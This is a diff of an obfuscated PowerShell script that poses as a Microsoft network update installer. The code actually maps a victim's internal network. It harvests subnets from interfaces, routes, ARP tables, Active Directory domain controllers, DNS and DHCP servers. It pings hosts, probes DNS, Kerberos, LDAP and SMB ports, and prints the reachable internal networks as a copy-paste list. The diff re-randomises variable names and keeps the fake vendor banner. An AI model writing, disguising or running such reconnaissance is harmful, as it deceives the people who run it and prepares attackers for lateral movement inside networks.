@@ -2,55 +2,58 @@ Clear-Host
 Write-Host "===== MICROSOFT NETWORK V1.0.45.1e UPDATE INSTALLER =====" -ForegroundColor Cyan
 Write-Host ""
 
+
+
+
+
 function Get-SubnetFromIP {
-    param($Hza2DWVtqPBK4to,$3YKpH9puctONmbrwMzb6S9U = 24)
+    param($hmisZQkcDHaYvKdV32FolW,$9r5 = 24)
 
-    if ($Hza2DWVtqPBK4to -match "^\d+\.\d+\.\d+\.\d+$") {
-        $ANui8YNXq = $Hza2DWVtqPBK4to.Split(".")
+    if ($hmisZQkcDHaYvKdV32FolW -match "^\d+\.\d+\.\d+\.\d+$") {
+        $99ux794 = $hmisZQkcDHaYvKdV32FolW.Split(".")
 
-        if ($ANui8YNXq[0] -eq "10") {
+        if ($99ux794[0] -eq "10") {
             return "10.0.0.0/8"
         }
 
-        if ($ANui8YNXq[0] -eq "172" -and [int]$ANui8YNXq[1] -ge 16 -and [int]$ANui8YNXq[1] -le 31) {
+        if ($99ux794[0] -eq "172" -and [int]$99ux794[1] -ge 16 -and [int]$99ux794[1] -le 31) {
             return "172.16.0.0/12"
         }
 
-        if ($ANui8YNXq[0] -eq "192" -and $ANui8YNXq[1] -eq "168") {
+        if ($99ux794[0] -eq "192" -and $99ux794[1] -eq "168") {
             return "192.168.0.0/16"
         }
 
-        return "$($ANui8YNXq[0]).$($ANui8YNXq[1]).$($ANui8YNXq[2]).0/24"
+        return "$($99ux794[0]).$($99ux794[1]).$($99ux794[2]).0/24"
     }
 
     return $null
 }
 
 function Test-FastPing {
-    param($Hza2DWVtqPBK4to)
+    param($hmisZQkcDHaYvKdV32FolW)
 
     try {
-        $pf6GBT5rOujn = New-Object System.Net.NetworkInformation.Ping
-        $MCKPea3JAi8sfTBx72oQHcu6E = $pf6GBT5rOujn.Send($Hza2DWVtqPBK4to,150)
-
-        return ($MCKPea3JAi8sfTBx72oQHcu6E.Status -eq "Success")
+        $UoLv3nGgcbs5zsI = New-Object System.Net.NetworkInformation.Ping
+        $I08efyduENth7AJsCU = $UoLv3nGgcbs5zsI.Send($hmisZQkcDHaYvKdV32FolW,150)
+        return ($I08efyduENth7AJsCU.Status -eq "Success")
     }
     catch { return $false }
 }
 
 function Test-FastPort {
-    param($Hza2DWVtqPBK4to,$1JyxKW9Vy)
+    param($hmisZQkcDHaYvKdV32FolW,$9Wre)
 
     try {
-        $Xi = New-Object System.Net.Sockets.TcpClient
-        $tFU0OZdS3R = $Xi.BeginConnect($Hza2DWVtqPBK4to,$1JyxKW9Vy,$null,$null)
+        $z = New-Object System.Net.Sockets.TcpClient
+        $wb6Bk2ZwwCYKbpeD = $z.BeginConnect($hmisZQkcDHaYvKdV32FolW,$9Wre,$null,$null)
 
-        if ($tFU0OZdS3R.AsyncWaitHandle.WaitOne(100,$false) -and $Xi.Connected) {
-            $Xi.Close()
+        if ($wb6Bk2ZwwCYKbpeD.AsyncWaitHandle.WaitOne(100,$false) -and $z.Connected) {
+            $z.Close()
             return $true
         }
 
-        $Xi.Close()
+        $z.Close()
     }
     catch {}
 
@@ -62,15 +65,13 @@ function Test-FastPort {
 
 
 Write-Host "[+] Collecting Interface Networks..."
-$networksGFjLCThoW5U = @()
+$gPSEAtFGqoeCvzk0Rh5Is = @()
 
 Get-NetIPConfiguration | ForEach-Object {
     if ($_.IPv4Address.IPAddress) {
-
-        $Hza2DWVtqPBK4to = $_.IPv4Address.IPAddress
-        $73sNhc0bU5APzGdZD = Get-SubnetFromIP $Hza2DWVtqPBK4to
-        if ($73sNhc0bU5APzGdZD -match "10\.|172\.|192\.168") {
-            $networksGFjLCThoW5U += $73sNhc0bU5APzGdZD
+        $z5wFeL7 = Get-SubnetFromIP $_.IPv4Address.IPAddress
+        if ($z5wFeL7 -match "10\.|172\.|192\.168") {
+            $gPSEAtFGqoeCvzk0Rh5Is += $z5wFeL7
         }
     }
 }
@@ -79,18 +80,18 @@ Write-Host "[+] Collecting Routing Table..."
 Get-NetRoute -AddressFamily IPv4 |
 Where-Object { $_.DestinationPrefix -match "10\.|172\.|192\.168" } |
 ForEach-Object {
-    $networksGFjLCThoW5U += $_.DestinationPrefix
+    $gPSEAtFGqoeCvzk0Rh5Is += $_.DestinationPrefix
 }
 
 Write-Host "[+] Collecting ARP Evidence..."
-$XopTwUVBRfHbg8 = Get-NetNeighbor |
+$oAYHF = Get-NetNeighbor |
 Where-Object { $_.State -ne "Unreachable" -and $_.IPAddress -match "^\d+\." } |
 Select-Object -ExpandProperty IPAddress -Unique
 
-foreach ($Hza2DWVtqPBK4to in $XopTwUVBRfHbg8) {
-    $ANui8YNXq = $Hza2DWVtqPBK4to.Split(".")
-    if ($ANui8YNXq[0] -in @("10","172","192")) {
-        $networksGFjLCThoW5U += "$($ANui8YNXq[0]).$($ANui8YNXq[1]).$($ANui8YNXq[2]).0/24"
+foreach ($hmisZQkcDHaYvKdV32FolW in $oAYHF) {
+    $99ux794 = $hmisZQkcDHaYvKdV32FolW.Split(".")
+    if ($99ux794[0] -in @("10","172","192")) {
+        $gPSEAtFGqoeCvzk0Rh5Is += "$($99ux794[0]).$($99ux794[1]).$($99ux794[2]).0/24"
     }
 }
 
@@ -100,53 +101,51 @@ foreach ($Hza2DWVtqPBK4to in $XopTwUVBRfHbg8) {
 
 Write-Host "[+] Correlating Domain Context..."
 
-$kUGyLCbTIq = @()
-
+$6ptVadU1hM355KwJE = @()
 
 try {
-    $emjbhTKkCx8aJV = Get-ADDomain -ErrorAction SilentlyContinue
-    if ($emjbhTKkCx8aJV) {
-        Write-Host "    [+] Domain Detected: $($emjbhTKkCx8aJV.Name)"
+    $YbdsQF8l15Cmw0 = Get-ADDomain -ErrorAction SilentlyContinue
+    if ($YbdsQF8l15Cmw0) {
 
-        $dp6qvlHPreEoUXhmyISaKRG2 = Get-ADDomainController -Filter * -ErrorAction SilentlyContinue
-        foreach ($cByyh0ZRi in $dp6qvlHPreEoUXhmyISaKRG2) {
-            if ($cByyh0ZRi.IPv4Address) { $kUGyLCbTIq += $cByyh0ZRi.IPv4Address }
+        Write-Host "    [+] Domain: $($YbdsQF8l15Cmw0.Name)"
+
+        $5ZKifbhauDLQKt7iOm = Get-ADDomainController -Filter * -ErrorAction SilentlyContinue
+        foreach ($LOAw0PMoHIN6XxBc19bZVYT in $5ZKifbhauDLQKt7iOm) {
+            if ($LOAw0PMoHIN6XxBc19bZVYT.IPv4Address) { $6ptVadU1hM355KwJE += $LOAw0PMoHIN6XxBc19bZVYT.IPv4Address }
         }
     }
 }
 catch {}
 
-
 try {
-    $V = Get-DnsClientServerAddress -AddressFamily IPv4 |
+    $suLu5pcsDmZ9E = Get-DnsClientServerAddress -AddressFamily IPv4 |
                   Select-Object -ExpandProperty ServerAddresses -Unique
 
-    $kUGyLCbTIq += $V
+    $6ptVadU1hM355KwJE += $suLu5pcsDmZ9E
 }
 catch {}
-
 
 try {
-    $1kzyNhw6cCQtOmfXirGBYHaRq = Get-DhcpServerInDC -ErrorAction SilentlyContinue
-    foreach ($q7DpaGVdfH0 in $1kzyNhw6cCQtOmfXirGBYHaRq) {
-        if ($q7DpaGVdfH0.IPAddress) { $kUGyLCbTIq += $q7DpaGVdfH0.IPAddress }
+    $pxmWkY5fNhfZt = Get-DhcpServerInDC -ErrorAction SilentlyContinue
+    foreach ($r4oJZpUmjM87g9bRTNw1CfcsK in $pxmWkY5fNhfZt) {
+        if ($r4oJZpUmjM87g9bRTNw1CfcsK.IPAddress) { $6ptVadU1hM355KwJE += $r4oJZpUmjM87g9bRTNw1CfcsK.IPAddress }
     }
 }
 catch {}
 
-foreach ($Hza2DWVtqPBK4to in $kUGyLCbTIq) {
-    $ANui8YNXq = $Hza2DWVtqPBK4to.Split(".")
-    if ($ANui8YNXq[0] -in @("10","172","192")) {
-        $networksGFjLCThoW5U += "$($ANui8YNXq[0]).$($ANui8YNXq[1]).$($ANui8YNXq[2]).0/24"
+foreach ($hmisZQkcDHaYvKdV32FolW in $6ptVadU1hM355KwJE) {
+    $99ux794 = $hmisZQkcDHaYvKdV32FolW.Split(".")
+    if ($99ux794[0] -in @("10","172","192")) {
+        $gPSEAtFGqoeCvzk0Rh5Is += "$($99ux794[0]).$($99ux794[1]).$($99ux794[2]).0/24"
     }
 }
 
-$networksGFjLCThoW5U = $networksGFjLCThoW5U |
+$gPSEAtFGqoeCvzk0Rh5Is = $gPSEAtFGqoeCvzk0Rh5Is |
             Where-Object { $_ -match "10\.|172\.|192\.168" } |
             Sort-Object -Unique
 
 Write-Host ""
-Write-Host "Discovered Private Networks: $($networksGFjLCThoW5U.Count)"
+Write-Host "Discovered Private Networks: $($gPSEAtFGqoeCvzk0Rh5Is.Count)"
 Write-Host ""
 
 
@@ -155,52 +154,42 @@ Write-Host ""
 
 Write-Host "[+] Validating Internal Reachability..."
 
-$1hCNqRu5ci = @()
+$IYGUewtP2TlhRVKC = @()
 
-foreach ($73sNhc0bU5APzGdZD in $networksGFjLCThoW5U) {
+foreach ($z5wFeL7 in $gPSEAtFGqoeCvzk0Rh5Is) {
 
-    $RTJDhmQCadcitOfUvN7 = ($73sNhc0bU5APzGdZD -split "/")[0]
-    $ANui8YNXq = $RTJDhmQCadcitOfUvN7.Split(".")
-    if ($ANui8YNXq.Count -lt 3) { continue }
+    $jZsAe74V3j5EdgMAfpnPJI = ($z5wFeL7 -split "/")[0]
+    $99ux794 = $jZsAe74V3j5EdgMAfpnPJI.Split(".")
+    if ($99ux794.Count -lt 3) { continue }
 
-    $lm9L09xZyH1otq3F9 = "$($ANui8YNXq[0]).$($ANui8YNXq[1]).$($ANui8YNXq[2])"
-    $lbgXolRpc9rU0B7fIAGkZbDNJ = 0
+    $3eIh5OJUVQv = "$($99ux794[0]).$($99ux794[1]).$($99ux794[2])"
+    $5EeVpepsyIarv0zq = 0
 
-    
-    if ($kUGyLCbTIq | Where-Object { $_ -like "$lm9L09xZyH1otq3F9.*" }) {
-        $lbgXolRpc9rU0B7fIAGkZbDNJ += 3
-    }
+    if ($6ptVadU1hM355KwJE | Where-Object { $_ -like "$3eIh5OJUVQv.*" }) { $5EeVpepsyIarv0zq += 3 }
+    if ($oAYHF | Where-Object { $_ -like "$3eIh5OJUVQv.*" }) { $5EeVpepsyIarv0zq += 2 }
 
-    
-    if ($XopTwUVBRfHbg8 | Where-Object { $_ -like "$lm9L09xZyH1otq3F9.*" }) {
-        $lbgXolRpc9rU0B7fIAGkZbDNJ += 2
-    }
-
-    
-    $feiTM1beTCkj = Get-NetRoute -DestinationPrefix "0.0.0.0/0" |
+    $ZAG7hfp8C8x0DOGEryJtsMG = Get-NetRoute -DestinationPrefix "0.0.0.0/0" |
           Select-Object -First 1 -ExpandProperty NextHop -ErrorAction SilentlyContinue
 
-    if ($feiTM1beTCkj -like "$lm9L09xZyH1otq3F9.*") { $lbgXolRpc9rU0B7fIAGkZbDNJ++ }
+    if ($ZAG7hfp8C8x0DOGEryJtsMG -like "$3eIh5OJUVQv.*") { $5EeVpepsyIarv0zq++ }
 
-    
-    $oKRZH2CSOt2qAxN59EBmN = @("$lm9L09xZyH1otq3F9.1","$lm9L09xZyH1otq3F9.254","$lm9L09xZyH1otq3F9.$(Get-Random -Minimum 10 -Maximum 200)")
+    $gRcXSETw2 = @("$3eIh5OJUVQv.1","$3eIh5OJUVQv.254","$3eIh5OJUVQv.$(Get-Random -Minimum 5 -Maximum 200)")
 
-    foreach ($PeX546JKA70m3ylprb9SBHFIU in $oKRZH2CSOt2qAxN59EBmN) {
-        if (Test-FastPing $PeX546JKA70m3ylprb9SBHFIU) { $lbgXolRpc9rU0B7fIAGkZbDNJ++ ; break }
+    foreach ($EXxhzujgdWA3J in $gRcXSETw2) {
+        if (Test-FastPing $EXxhzujgdWA3J) { $5EeVpepsyIarv0zq++; break }
     }
 
-    
-    foreach ($1JyxKW9Vy in @(53,88,389,445)) {
-        if (Test-FastPort "$lm9L09xZyH1otq3F9.1" $1JyxKW9Vy) { $lbgXolRpc9rU0B7fIAGkZbDNJ++ }
+    foreach ($9Wre in @(53,88,389,445)) {
+        if (Test-FastPort "$3eIh5OJUVQv.1" $9Wre) { $5EeVpepsyIarv0zq++ }
     }
 
-    if ($lbgXolRpc9rU0B7fIAGkZbDNJ -ge 2) {
-        Write-Host "[+] PATCHING -> $lm9L09xZyH1otq3F9.0/24 (Score:$lbgXolRpc9rU0B7fIAGkZbDNJ)" -ForegroundColor Cyan
-        $1hCNqRu5ci += "$lm9L09xZyH1otq3F9.0/24"
+    if ($5EeVpepsyIarv0zq -ge 2) {
+        Write-Host "[+] ACTIVE -> $3eIh5OJUVQv.0/24 (Score:$5EeVpepsyIarv0zq)" -ForegroundColor Cyan
+        $IYGUewtP2TlhRVKC += "$3eIh5OJUVQv.0/24"
     }
 }
 
-$1hCNqRu5ci = $1hCNqRu5ci | Sort-Object -Unique
+$IYGUewtP2TlhRVKC = $IYGUewtP2TlhRVKC | Sort-Object -Unique
 
 
 
@@ -208,17 +197,37 @@ $1hCNqRu5ci = $1hCNqRu5ci | Sort-Object -Unique
 
 Write-Host ""
 Write-Host "========================================="
-Write-Host "NETWORK UPDATES AVAILABLE"
+Write-Host "REACHABLE INTERNAL NETWORKS"
 Write-Host "========================================="
 Write-Host ""
 
-if ($1hCNqRu5ci.Count -eq 0) {
+if ($IYGUewtP2TlhRVKC.Count -eq 0) {
     Write-Host " -> No internal networks confirmed."
 }
 else {
-    foreach ($j7gIC2KTdcHuoOBL in $1hCNqRu5ci) {
-        Write-Host " -> $j7gIC2KTdcHuoOBL"
+    foreach ($n4uJtFXOfipTWwjm5 in $IYGUewtP2TlhRVKC) {
+        Write-Host " -> $n4uJtFXOfipTWwjm5"
     }
+}
+
+
+
+
+
+Write-Host ""
+Write-Host "========================================="
+Write-Host "COPY-PASTE FORMAT"
+Write-Host "========================================="
+Write-Host ""
+
+if ($IYGUewtP2TlhRVKC.Count -gt 0) {
+
+    $jASaNYB12 = ($IYGUewtP2TlhRVKC | ForEach-Object { $_ }) -join ", "
+
+    Write-Host $jASaNYB12
+}
+else {
+    Write-Host "No active networks to export."
 }
 
 Write-Host ""
